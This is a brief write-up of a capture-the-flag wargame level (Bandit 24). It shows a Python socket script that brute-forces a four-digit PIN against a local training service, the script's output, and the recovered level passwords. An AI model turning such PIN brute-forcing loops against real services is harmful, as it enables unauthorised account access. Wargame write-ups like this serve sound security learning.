### Bandit 24
*** 
```
b'Wrong! Please enter the correct pincode. Try again.\n'
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 2588

b'Correct!\nThe password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\n\nExiting.\n'
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 2589

^ Bruteforced it.
```
Bruteforce script was rather simple.
```
bandit24@bandit:/tmp/pewpew24$ cat script.py 
#!/bin/env python3
import socket
HOST = '127.0.0.1'
PORT = 30002
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    for i in range (1000,10000):
        content = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ "+str(i)+"\n"
        print(content)
        s.sendall(str.encode(content))
        data = s.recv(2048)
        print(data)
bandit24@bandit:/tmp/pewpew24$ 

```
